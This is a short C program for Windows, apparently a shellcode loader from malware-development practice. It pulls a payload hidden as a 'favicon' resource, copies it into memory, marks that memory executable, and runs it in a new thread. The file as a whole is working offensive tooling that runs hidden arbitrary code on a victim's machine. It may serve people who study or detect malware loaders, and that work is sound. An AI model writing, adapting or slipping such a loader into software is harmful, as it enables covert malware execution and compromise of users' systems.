#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "resources.h"

int main(void) {
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	RtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	
	printf("W A I T F O R I T");
	
	if (rv!=0){
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	
	return 0;
}
